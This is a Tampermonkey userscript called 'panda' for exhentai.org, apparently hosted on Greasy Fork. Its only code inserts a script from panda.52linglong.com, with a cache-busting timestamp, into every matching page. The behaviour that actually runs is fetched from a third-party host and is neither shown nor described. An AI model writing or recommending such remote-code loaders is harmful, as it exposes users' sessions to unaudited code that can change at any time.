// ==UserScript==
// @name         panda
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  expanda
// @author       https://panda.52linglong.com/
// @match        *://*.exhentai.org/*
// @description       https://code.jquery.com/jquery-1.12.4.min.js
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/398372/panda.user.js
// @updateURL https://update.greasyfork.org/scripts/398372/panda.meta.js
// ==/UserScript==
(function(){'use strict';if(window.location.hostname=='exhentai.org'){var a=document.createElement('script');a.src='//panda.52linglong.com/panda.js?'+parseInt(Date.parse(new Date())/600000);document.body.appendChild(a);}})();